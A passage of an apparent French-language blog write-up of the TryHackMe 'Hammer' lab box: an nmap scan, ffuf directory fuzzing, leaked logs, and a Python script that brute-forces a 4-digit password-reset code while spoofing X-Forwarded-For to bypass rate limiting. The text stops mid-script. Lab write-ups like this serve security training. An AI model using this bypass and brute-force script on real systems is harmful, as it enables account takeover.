<!DOCTYPE html>
<html lang="fr-fr" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="üî® Hammer# Hammer est une box de niveau moyen qui consiste √† exploiter les vuln√©rabilit√©s d‚Äôun syst√®me d‚Äôauthentification. Apr√®s une br√®ve √©num√©ration des ports, on se retrouve sur une page d‚Äôauthentification classique avec login/mot de passe et le lien pour r√©initialiser le mot de passe. Nous n‚Äôavons pas de comptes ni d‚Äôemail donc nous allons commencer √† √©num√©rer les dossiers possibles.
Reconnaissance# Port Enumeration# nmap -sS -sV -p- hammer.thm Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-23 20:00 GMT mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for hammer.thm (10.80.140.21) Host is up (0.0021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 1337/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.43 secondsDirectory Enumeration# Dans le code source de l‚Äôapplication, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : ‚Äúhmr_NOMDOSSER‚Äù.
">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/tryhackme/collapsed/hammer/">
  <meta property="og:site_name" content="Blog de @camillegr">
  <meta property="og:title" content="Hammer">
  <meta property="og:description" content="üî® Hammer# Hammer est une box de niveau moyen qui consiste √† exploiter les vuln√©rabilit√©s d‚Äôun syst√®me d‚Äôauthentification. Apr√®s une br√®ve √©num√©ration des ports, on se retrouve sur une page d‚Äôauthentification classique avec login/mot de passe et le lien pour r√©initialiser le mot de passe. Nous n‚Äôavons pas de comptes ni d‚Äôemail donc nous allons commencer √† √©num√©rer les dossiers possibles.
Reconnaissance# Port Enumeration# nmap -sS -sV -p- hammer.thm Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-23 20:00 GMT mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for hammer.thm (10.80.140.21) Host is up (0.0021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 1337/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.43 secondsDirectory Enumeration# Dans le code source de l‚Äôapplication, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : ‚Äúhmr_NOMDOSSER‚Äù.">
  <meta property="og:locale" content="fr_fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">


  <meta itemprop="name" content="Hammer">
  <meta itemprop="description" content="üî® Hammer# Hammer est une box de niveau moyen qui consiste √† exploiter les vuln√©rabilit√©s d‚Äôun syst√®me d‚Äôauthentification. Apr√®s une br√®ve √©num√©ration des ports, on se retrouve sur une page d‚Äôauthentification classique avec login/mot de passe et le lien pour r√©initialiser le mot de passe. Nous n‚Äôavons pas de comptes ni d‚Äôemail donc nous allons commencer √† √©num√©rer les dossiers possibles.
Reconnaissance# Port Enumeration# nmap -sS -sV -p- hammer.thm Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-23 20:00 GMT mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for hammer.thm (10.80.140.21) Host is up (0.0021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 1337/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.43 secondsDirectory Enumeration# Dans le code source de l‚Äôapplication, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : ‚Äúhmr_NOMDOSSER‚Äù.">
  <meta itemprop="wordCount" content="1181">

<title>Hammer | Blog de @camillegr</title>
<link rel="icon" href="/favicon.png" >
<link rel="manifest" href="/manifest.json">
<link rel="canonical" href="http://localhost:1313/docs/tryhackme/collapsed/hammer/">
<link rel="stylesheet" href="/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">


  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.aa3e45dc883265ddd9a1ef8c539caf21b27fd3b7d511e89e355c0164359a2193.js" integrity="sha256-qj5F3IgyZd3Zoe&#43;MU5yvIbJ/07fVEeieNVwBZDWaIZM=" crossorigin="anonymous"></script>



  
</head>
<body dir="ltr" class="book-kind-page book-type-docs">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    
<aside class="book-menu">
  <div class="book-menu-content">
    
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Blog de @camillegr</span>
  </a>
</h2>


<div class="book-search hidden">
  <input id="book-search-input" type="text" 
    placeholder="Search"
    aria-label="Search"
    maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>













  
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-a1af4a996fb1fd454470e4444972e4f9" class="toggle"  />
    <label for="section-a1af4a996fb1fd454470e4444972e4f9" class="flex">
      <a href="/docs/ctf/" class="">
        CTF</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-f3561ec6727758028b3a2ef314dd5169" class="toggle"  />
    <label for="section-f3561ec6727758028b3a2ef314dd5169" class="flex">
      <a href="/docs/ctf/rootmepro2025/" class="">
        CTF 2025 |¬†Root-Me Pro x DGSE</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission1/" class="">
      Mission 1 - IA</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission2/" class="">
      Mission 2 - SOC</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission3/" class="">
      Mission 3 - Forensic</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission4/" class="">
      Mission 4 - Pentest</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission5/" class="">
      Mission 5 - Mobile</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ctf/rootmepro2025/collapsed/mission6/" class="">
      Mission 6 - OSINT</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="toggle"  />
    <label for="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="flex">
      <a role="button" class="">
        Projets Personnels</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/projets/collapsed/tofuzz/" class="">
      ToFuzz</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-c65aa4e708b6bdd64019a9cd49da31df" class="toggle" checked />
    <label for="section-c65aa4e708b6bdd64019a9cd49da31df" class="flex">
      <a href="/docs/tryhackme/" class="">
        TryHackMe</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/hammer/" class="active">
      Hammer</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/mrrobot/" class="">
      Mr Robot</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/rootme/" class="">
      RootMe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/tokyog/" class="">
      Tokyo Ghoul</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tryhackme/collapsed/wonderlands/" class="">
      Wonderlands</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <a>
      Divers</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/divers/blogs/" class="">
      Blogs</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>













</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>



  </div>
</aside>
 

    <div class="book-page">
      <header class="book-header hidden">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <h3>Hammer</h3>

  <label for="toc-control">
    
    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#-hammer">üî® Hammer</a>
      <ul>
        <li><a href="#reconnaissance">Reconnaissance</a>
          <ul>
            <li><a href="#port-enumeration">Port Enumeration</a></li>
            <li><a href="#directory-enumeration">Directory Enumeration</a></li>
            <li><a href="#logs">Logs</a></li>
          </ul>
        </li>
        <li><a href="#exploitation">Exploitation</a>
          <ul>
            <li><a href="#contournement-des-limitations">Contournement des limitations</a></li>
            <li><a href="#r√©initialisation-du-mot-de-passe">R√©initialisation du mot de passe</a></li>
            <li><a href="#commandes-dadministration">Commandes d&rsquo;administration</a></li>
            <li><a href="#enum√©ration-locale">Enum√©ration locale</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#post-exploitation--escalade-de-privil√®ge">Post Exploitation : Escalade de privil√®ge</a>
      <ul>
        <li><a href="#faille">Faille</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="-hammer">üî® Hammer<a class="anchor" href="#-hammer">#</a></h1>
<p>Hammer est une box de niveau moyen qui consiste √† exploiter les vuln√©rabilit√©s d&rsquo;un syst√®me d&rsquo;authentification. Apr√®s une br√®ve √©num√©ration des ports, on se retrouve sur une page d&rsquo;authentification classique avec login/mot de passe et le lien pour r√©initialiser le mot de passe. Nous n&rsquo;avons pas de comptes ni d&rsquo;email donc nous allons commencer √† √©num√©rer les dossiers possibles.</p>
<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
<h3 id="port-enumeration">Port Enumeration<a class="anchor" href="#port-enumeration">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -sV -p- hammer.thm
</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff6ac1">(</span> https://nmap.org <span style="color:#ff6ac1">)</span> at 2025-11-23 20:00 GMT
</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff6ac1">for</span> hammer.thm <span style="color:#ff6ac1">(</span>10.80.140.21<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff6ac1">(</span>0.0021s latency<span style="color:#ff6ac1">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ff9f43">65533</span> closed ports
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#ff6ac1">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>1337/tcp open  http    Apache httpd 2.4.41 <span style="color:#ff6ac1">((</span>Ubuntu<span style="color:#ff6ac1">))</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff6ac1">done</span>: <span style="color:#ff9f43">1</span> IP address <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">1</span> host up<span style="color:#ff6ac1">)</span> scanned in 15.43 seconds</span></span></code></pre></div><h3 id="directory-enumeration">Directory Enumeration<a class="anchor" href="#directory-enumeration">#</a></h3>
<p>Dans le code source de l&rsquo;application, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : &ldquo;hmr_NOMDOSSER&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://hammer.thm:1337/hmr_FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#5af78e">&#39;___\  /&#39;</span>___<span style="color:#5af78e">\ </span>          /<span style="color:#ff5c57">&#39;</span>___<span style="color:#5af78e">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#5af78e">\ \_</span>_/ /<span style="color:#5af78e">\ \_</span>_/  __  __  /<span style="color:#5af78e">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#5af78e">\ \ </span>,__<span style="color:#5af78e">\\</span> <span style="color:#5af78e">\ </span>,__<span style="color:#5af78e">\/\ \/\ \ \ \ </span>,__<span style="color:#5af78e">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#5af78e">\ \ \_</span>/ <span style="color:#5af78e">\ \ \_</span>/<span style="color:#5af78e">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#5af78e">\ \_\ </span>  <span style="color:#5af78e">\ \_\ </span> <span style="color:#5af78e">\ \_</span>___/  <span style="color:#5af78e">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#5af78e">\/</span>_/    <span style="color:#5af78e">\/</span>_/   <span style="color:#5af78e">\/</span>___/    <span style="color:#5af78e">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v1.3.1
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://hammer.thm:1337/hmr_FUZZ
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : <span style="color:#ff5c57">false</span>
</span></span><span style="display:flex;"><span> :: Calibration      : <span style="color:#ff5c57">false</span>
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ff9f43">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ff9f43">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>images                  <span style="color:#ff6ac1">[</span>Status: 301, Size: 320, Words: 20, Lines: 10<span style="color:#ff6ac1">]</span>
</span></span><span style="display:flex;"><span>css                     <span style="color:#ff6ac1">[</span>Status: 301, Size: 317, Words: 20, Lines: 10<span style="color:#ff6ac1">]</span>
</span></span><span style="display:flex;"><span>js                      <span style="color:#ff6ac1">[</span>Status: 301, Size: 316, Words: 20, Lines: 10<span style="color:#ff6ac1">]</span>
</span></span><span style="display:flex;"><span>logs                    <span style="color:#ff6ac1">[</span>Status: 301, Size: 318, Words: 20, Lines: 10<span style="color:#ff6ac1">]</span></span></span></code></pre></div><h3 id="logs">Logs<a class="anchor" href="#logs">#</a></h3>
<p>Dans le dossier logs on trouve :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:00:01.123456 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12345:tid 139999999999999<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.10:56832<span style="color:#ff6ac1">]</span> AH00124: Request exceeded the limit of <span style="color:#ff9f43">10</span> internal redirects due to probable configuration error. Use <span style="color:#5af78e">&#39;LimitInternalRecursion&#39;</span> to increase the limit <span style="color:#ff6ac1">if</span> necessary. Use <span style="color:#5af78e">&#39;LogLevel debug&#39;</span> to get a backtrace.
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:01:22.987654 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>authz_core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12346:tid 139999999999998<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.15:45918<span style="color:#ff6ac1">]</span> AH01630: client denied by server configuration: /var/www/html/
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:02:34.876543 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>authz_core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12347:tid 139999999999997<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.12:37210<span style="color:#ff6ac1">]</span> AH01631: user tester@hammer.thm: authentication failure <span style="color:#ff6ac1">for</span> <span style="color:#5af78e">&#34;/restricted-area&#34;</span>: Password Mismatch
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:03:45.765432 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>authz_core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12348:tid 139999999999996<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.20:37254<span style="color:#ff6ac1">]</span> AH01627: client denied by server configuration: /etc/shadow
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:04:56.654321 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12349:tid 139999999999995<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.22:38100<span style="color:#ff6ac1">]</span> AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:05:07.543210 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>authz_core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12350:tid 139999999999994<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.25:46234<span style="color:#ff6ac1">]</span> AH01627: client denied by server configuration: /home/hammerthm/test.php
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:06:18.432109 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>authz_core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12351:tid 139999999999993<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.30:40232<span style="color:#ff6ac1">]</span> AH01617: user tester@hammer.thm: authentication failure <span style="color:#ff6ac1">for</span> <span style="color:#5af78e">&#34;/admin-login&#34;</span>: Invalid email address
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:07:29.321098 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12352:tid 139999999999992<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.35:42310<span style="color:#ff6ac1">]</span> AH00124: Request exceeded the limit of <span style="color:#ff9f43">10</span> internal redirects due to probable configuration error. Use <span style="color:#5af78e">&#39;LimitInternalRecursion&#39;</span> to increase the limit <span style="color:#ff6ac1">if</span> necessary. Use <span style="color:#5af78e">&#39;LogLevel debug&#39;</span> to get a backtrace.
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>Mon Aug <span style="color:#ff9f43">19</span> 12:09:51.109876 2024<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>core:error<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>pid 12354:tid 139999999999990<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>client 192.168.1.50:45998<span style="color:#ff6ac1">]</span> AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down</span></span></code></pre></div><p>On apprend donc :</p>
<ul>
<li>Qu&rsquo;il y a un utilisateur ayant pour mail : <a href="mailto:tester@hammer.thm">tester@hammer.thm</a></li>
<li>l&rsquo;application a pour contexte d&rsquo;execution le dossier /var/www/html</li>
</ul>
<h2 id="exploitation">Exploitation<a class="anchor" href="#exploitation">#</a></h2>
<p>On observe que la fonctionnalit√© de r√©initialisation du mot de passe utilise un rate limit. on va automatiser le brute-force du reset de mot de passe (l‚Äôenvoi du code pin √† 4 digits) et essayer de contourner la limitation.</p>
<h3 id="contournement-des-limitations">Contournement des limitations<a class="anchor" href="#contournement-des-limitations">#</a></h3>
<p>Pour contourner le Send-Rate-Limit, on essaie ces diff√©rentes options :</p>
<ul>
<li><strong>Parameter Pollution</strong> : KO ‚Äî&gt; Impossible d‚Äô√©lever la limite ou alors de d√©finir le recovery_code √† la main</li>
<li><strong>Changement de User-Agent</strong> : KO ‚Äî&gt; La limite reste</li>
<li><strong>Modification de la casse</strong> : KO ‚Äî&gt; erreur Apache</li>
<li><strong>X-Forwarded-For</strong> : OK ‚Äî&gt; Bypass : on arrive √† faire un nombre illimit√© de requ√™tes</li>
</ul>
<h3 id="r√©initialisation-du-mot-de-passe">R√©initialisation du mot de passe<a class="anchor" href="#r%c3%a9initialisation-du-mot-de-passe">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#78787e">#!python3 
</span></span></span><span style="display:flex;"><span>import requests, sys, re, <span style="color:#ff5c57">time</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">s</span> <span style="color:#ff6ac1">=</span> requests.Session<span style="color:#ff6ac1">()</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">NEW_PASS</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;password123&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">URL</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://hammer.thm:1337/reset_password.php&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">headers</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">{</span> <span style="color:#5af78e">&#34;Content-Type&#34;</span>: <span style="color:#5af78e">&#34;application/x-www-form-urlencoded&#34;</span>, <span style="color:#5af78e">&#34;Rate-Limit-Pending&#34;</span>:<span style="color:#5af78e">&#34;10000&#34;</span><span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">s_code</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">180</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">delay</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s.get<span style="color:#ff6ac1">(</span>URL<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">primo</span> <span style="color:#ff6ac1">=</span> s.post<span style="color:#ff6ac1">(</span>URL, <span style="color:#ff5c57">data</span><span style="color:#ff6ac1">={</span><span style="color:#5af78e">&#34;email&#34;</span>:<span style="color:#5af78e">&#39;tester@hammer.thm&#39;</span><span style="color:#ff6ac1">}</span>, <span style="color:#ff5c57">headers</span><span style="color:#ff6ac1">=</span>headers<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#ff6ac1">(</span>f<span style="color:#5af78e">&#34;{primo.headers}&#34;</span><span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#39;#&#39;</span>*20<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> i in <span style="color:#ff6ac1">[</span><span style="color:#5af78e">&#34;%04d&#34;</span> % x <span style="color:#ff6ac1">for</span> x in range<span style="color:#ff6ac1">(</span>10000<span style="color:#ff6ac1">)]</span> :
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">datas</span><span style="color:#ff6ac1">={</span><span style="color:#5af78e">&#34;recovery_code&#34;</span>:i,<span style="color:#5af78e">&#34;s&#34;</span>:s_code<span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span>    headers<span style="color:#ff6ac1">[</span><span style="color:#5af78e">&#34;User-Agent&#34;</span><span style="color:#ff6ac1">]=</span>f<span style="color:#5af78e">&#34;Test{i}&#34;</span>
</span></span><span style="display:flex;"><span>    headers<span style="color:#ff6ac1">[</span><span style="color:#5af78e">&#34;X-Forwarded-For&#34;</span><span style="color:#ff6ac1">]=</span>f<span style="color:#5af78e">&#34;0.0.0.{i}&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">r</span> <span style="color:#ff6ac1">=</span> s.post<span style="color:#ff6ac1">(</span>URL, <span style="color:#ff5c57">data</span><span style="color:#ff6ac1">=</span>datas, <span style="color:#ff5c57">headers</span><span style="color:#ff6ac1">=</span>headers<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>    print<span style="color:#ff6ac1">(</span>f<span style="color:#5af78e">&#34;CODE {i} (s={s_code}) : HTTP {r.status_code} &#34;</span><span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e">#    print(r.text)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> not <span style="color:#5af78e">&#34;Invalid or expired&#34;</span> in r.text :
</span></span><span style="display:flex;"><span>        print <span style="color:#ff6ac1">(</span>f<span style="color:#5af78e">&#34;[!] Code trouv√© : {i}&#34;</span><span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>        break;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># your code in 180 seconds</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">s_code</span> <span style="color:#ff6ac1">=</span> int<span style="color:#ff6ac1">(</span>re.search<span style="color:#ff6ac1">(</span>r<span style="color:#5af78e">&#39;your code in (\d+) seconds&#39;</span>, r.text<span style="color:#ff6ac1">)</span>.group<span style="color:#ff6ac1">(</span>1<span style="color:#ff6ac1">))</span>
